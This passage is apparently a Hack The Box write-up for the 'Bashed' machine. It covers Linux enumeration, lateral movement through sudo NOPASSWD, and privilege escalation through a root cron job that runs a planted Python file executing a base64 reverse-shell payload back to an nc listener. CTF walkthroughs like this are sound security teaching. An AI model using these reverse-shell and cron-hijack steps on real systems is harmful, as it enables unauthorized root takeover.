<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
</span><span class="z-text z-plain">DISTRIB_RELEASE=16.04
</span><span class="z-text z-plain">DISTRIB_CODENAME=xenial
</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.2 LTS&quot;
</span></code></pre>
<p>Okay, so it's Ubuntu 16.04.</p>
<h3 id="kernel">Kernel</h3>
<p>Let's find the kernel version of Bashed.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">4.4.0-62-generic
</span></code></pre>
<p>It's <code>4.4.0</code>.</p>
<h3 id="users">Users</h3>
<p>Let's enumerate all users.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">arrexel
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">scriptmanager
</span></code></pre>
<p>There's <code>arrexel</code>, <code>root</code> and <code>scriptmanager</code>.</p>
<h3 id="groups">Groups</h3>
<p>Let's enumerate all groups.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">adm
</span><span class="z-text z-plain">arrexel
</span><span class="z-text z-plain">audio
</span><span class="z-text z-plain">backup
</span><span class="z-text z-plain">bin
</span><span class="z-text z-plain">cdrom
</span><span class="z-text z-plain">crontab
</span><span class="z-text z-plain">daemon
</span><span class="z-text z-plain">dialout
</span><span class="z-text z-plain">dip
</span><span class="z-text z-plain">disk
</span><span class="z-text z-plain">fax
</span><span class="z-text z-plain">floppy
</span><span class="z-text z-plain">games
</span><span class="z-text z-plain">gnats
</span><span class="z-text z-plain">input
</span><span class="z-text z-plain">irc
</span><span class="z-text z-plain">kmem
</span><span class="z-text z-plain">list
</span><span class="z-text z-plain">lp
</span><span class="z-text z-plain">lpadmin
</span><span class="z-text z-plain">mail
</span><span class="z-text z-plain">man
</span><span class="z-text z-plain">messagebus
</span><span class="z-text z-plain">mlocate
</span><span class="z-text z-plain">netdev
</span><span class="z-text z-plain">news
</span><span class="z-text z-plain">nogroup
</span><span class="z-text z-plain">operator
</span><span class="z-text z-plain">plugdev
</span><span class="z-text z-plain">proxy
</span><span class="z-text z-plain">root
</span><span class="z-text z-plain">sambashare
</span><span class="z-text z-plain">sasl
</span><span class="z-text z-plain">scriptmanager
</span><span class="z-text z-plain">shadow
</span><span class="z-text z-plain">src
</span><span class="z-text z-plain">ssh
</span><span class="z-text z-plain">ssl-cert
</span><span class="z-text z-plain">staff
</span><span class="z-text z-plain">sudo
</span><span class="z-text z-plain">sys
</span><span class="z-text z-plain">syslog
</span><span class="z-text z-plain">systemd-bus-proxy
</span><span class="z-text z-plain">systemd-journal
</span><span class="z-text z-plain">systemd-network
</span><span class="z-text z-plain">systemd-resolve
</span><span class="z-text z-plain">systemd-timesync
</span><span class="z-text z-plain">tape
</span><span class="z-text z-plain">tty
</span><span class="z-text z-plain">users
</span><span class="z-text z-plain">utmp
</span><span class="z-text z-plain">uucp
</span><span class="z-text z-plain">uuidd
</span><span class="z-text z-plain">video
</span><span class="z-text z-plain">voice
</span><span class="z-text z-plain">www-data
</span></code></pre>
<h3 id="nics">NICs</h3>
<p>Let's gather the list of connected NICs.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:6e:c7  
</span><span class="z-text z-plain">          inet addr:10.10.10.68  Bcast:10.10.10.255  Mask:255.255.255.255
</span><span class="z-text z-plain">          inet6 addr: fe80::250:56ff:feb9:6ec7/64 Scope:Link
</span><span class="z-text z-plain">          inet6 addr: dead:beef::250:56ff:feb9:6ec7/64 Scope:Global
</span><span class="z-text z-plain">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class="z-text z-plain">          RX packets:66952 errors:0 dropped:16 overruns:0 frame:0
</span><span class="z-text z-plain">          TX packets:66420 errors:0 dropped:0 overruns:0 carrier:0
</span><span class="z-text z-plain">          collisions:0 txqueuelen:1000 
</span><span class="z-text z-plain">          RX bytes:4046934 (4.0 MB)  TX bytes:4091220 (4.0 MB)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">lo        Link encap:Local Loopback  
</span><span class="z-text z-plain">          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class="z-text z-plain">          inet6 addr: ::1/128 Scope:Host
</span><span class="z-text z-plain">          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class="z-text z-plain">          RX packets:6720 errors:0 dropped:0 overruns:0 frame:0
</span><span class="z-text z-plain">          TX packets:6720 errors:0 dropped:0 overruns:0 carrier:0
</span><span class="z-text z-plain">          collisions:0 txqueuelen:1 
</span><span class="z-text z-plain">          RX bytes:497280 (497.2 KB)  TX bytes:497280 (497.2 KB)
</span></code></pre>
<p>There's an Ethernet interface and the loopback interface.</p>
<h3 id="hostname">Hostname</h3>
<p>What is Bashed's hostname?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">bashed
</span></code></pre>
<p>Yeah I know, very surprising.</p>
<h2 id="system-enumeration">System enumeration</h2>
<h3 id="flags">Flags</h3>
<p>If we check <code>arrexel</code>'s home folder, we find the user flag.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/arrexel/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">2cae1f23aa11c5393b7e832b04810c9f
</span></code></pre>
<h3 id="website-code-review">Website code review</h3>
<p>Let's review the content of the Apache website, located at <code>/var/www/html</code>.</p>
<p>The <code>config.php</code> file actually contains a dummy email. The <code>uploads</code> folder only
contains a blank <code>index.html</code> file, but the <code>php</code> folder contains a mysterious
<code>sendMail.php</code> file.</p>
<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">if (isset($_POST[&quot;action&quot;])) {
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    $action = $_POST[&quot;action&quot;];
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    switch ($action) {
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">        case &quot;SendMessage&quot;:
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">            if (
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                isset($_POST[&quot;name&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                isset($_POST[&quot;email&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                isset($_POST[&quot;subject&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                isset($_POST[&quot;message&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                !empty($_POST[&quot;name&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                !empty($_POST[&quot;email&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                !empty($_POST[&quot;subject&quot;]) &amp;&amp;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                !empty($_POST[&quot;message&quot;])
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">            ) {
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                $message = $_POST[&quot;message&quot;];
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                $message .= &quot;<span class="z-meta z-tag z-inline z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-inline z-any z-html">br</span><span class="z-punctuation z-definition z-tag z-end z-html">/&gt;</span></span><span class="z-meta z-tag z-inline z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-inline z-any z-html">br</span><span class="z-punctuation z-definition z-tag z-end z-html">/&gt;</span></span>&quot;;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                $response = SendEmail(
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                    $message,
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                    $_POST[&quot;subject&quot;],
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                    $_POST[&quot;email&quot;],
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                    $email
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                )
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                    ? &quot;Message Sent&quot;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                    : &quot;Sending Message Failed&quot;;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">            } else {
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">                $response = &quot;Sending Message Failed&quot;;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">            }
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">            break;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">        default:
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">            $response = &quot;Invalid action is set! Action is: &quot; . $action;
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">    }
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic">}
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
</span></span></code></pre>
<p>This PHP file accepts a POST request. It sends an email with a custom message to
the specified recipient.</p>
<p>Let's investigate this functionality.</p>
<h2 id="services-enumeration-1">Services enumeration</h2>
<h3 id="apache-1">Apache</h3>
<p>Let's send a POST request to <code>http://10.10.10.68/php/sendMail.php</code> to send an email.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.68/php/sendMail.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>action=SendMessage<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>email=dummy@email.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>subject=dummySubject<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>message=dummyMessage<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>name=dummyName<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">{&quot;ResponseData&quot;:&quot;Message Sent&quot;}
</span></code></pre>
<p>According to the response, the message has been sent.</p>
<p>I tried sending an email to a temporary address, but I never received the email.
I guess it's a dead end.</p>
<h2 id="system-enumeration-1">System enumeration</h2>
<h3 id="sudo-permissions">Sudo permissions</h3>
<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">Matching Defaults entries for www-data on bashed:
</span><span class="z-text z-plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">User www-data may run the following commands on bashed:
</span><span class="z-text z-plain">    (scriptmanager : scriptmanager) NOPASSWD: ALL
</span></code></pre>
<p>We can run anything as <code>scriptmanager</code>!</p>
<h2 id="lateral-movement-sudo-permissions">Lateral movement (Sudo permissions)</h2>
<h3 id="exploitation-1">Exploitation</h3>
<p>Let's abuse our <code>sudo</code> permissions to execute <code>/bin/bash</code> as <code>scriptmanager</code>.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>scriptmanager<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>-i<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">scriptmanager@bashed:/var/www/html/dev$
</span></code></pre>
<p>Now we have a shell as <code>scriptmanager</code>!</p>
<h2 id="system-enumeration-2">System enumeration</h2>
<h3 id="exploring-scripts">Exploring <code>/scripts</code></h3>
<p>If we run <code>pspy</code>, we see that there's a cronjob running every minute that
executes all scripts in the <code>/scripts</code> folder as <code>root</code>.</p>
<p>Let's list the content of this folder.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">scriptmanager@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/scripts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
</span><span class="z-text z-plain">drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
</span><span class="z-text z-plain">-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
</span><span class="z-text z-plain">-rw-r--r--  1 root          root            12 Jan 25 01:46 test.txt
</span></code></pre>
<p>It contains two files: <code>test.py</code> and <code>test.txt</code>.</p>
<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">f</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">open</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">test.txt<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">w<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">f</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">write</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">testing 123!<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">f</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">close</span></span>
</span></code></pre>
<p>The <code>test.py</code> file opens <code>test.txt</code> and writes <code>testing 123!</code>. If we check
<code>test.txt</code>, we see that it indeed contains this string, meaning that it has
already been executed.</p>
<p>The good news is that we're the owner of the <code>/scripts</code> folder, and that <code>root</code>
executes all Python scripts in this folder. This means that we can create a
Python script that will be executed using <code>python</code> as <code>root</code>!</p>
<h2 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h2>
<h3 id="preparation-1">Preparation</h3>
<p>The goal is to obtain a reverse shell.</p>
<p>First, I'll setup a listener to receive the shell.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9002<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
shell.</p>
<h3 id="exploitation-2">Exploitation</h3>
<p>I'll create a <code>privesc.py</code> file in <code>/scripts</code> to execute this command:</p>
<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">system</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/bin/echo &lt;BASE64_REVSHELL_PAYLOAD&gt; | /usr/bin/base64 -d | /bin/bash -i<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></code></pre>
<p>We just have to wait for the cronjob to execute. Then, if we check our listener:</p>
<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.68] 42786
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">root@bashed:/scripts#
</span></code></pre>
<p>It caught the reverse shell!</p>
<h3 id="spawning-a-pty-1">Spawning a pty</h3>
<p>Let's use this one-liner to spawn a pty:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">python3</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>import pty; pty.spawn(&quot;/bin/bash&quot;)<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
</span></code></pre>
<h2 id="system-enumeration-3">System enumeration</h2>
<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
<h3 id="flags-1">Flags</h3>
<p>As usual, we can find the root flag in our home folder.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@bashed:/scripts#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">82ff29fb789abf36d69ea046c1847967
</span></code></pre>
<h1 id="afterwords">Afterwords</h1>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/success.png" alt="Success" /></p>
<p>That's it for this box! 🎉</p>
<p>I rated the user flag as 'Very easy' and the root flag as 'Easy'. The foothold
was really easy to find and to exploit. The privilege escalation was slightly
harder, as it first required to move laterally, and then to identify a cronjob
to get <code>root</code>.</p>
<p>Thanks for reading!</p>
</section>
</article>

    </main>

        <footer></footer>

    </body>
</html>
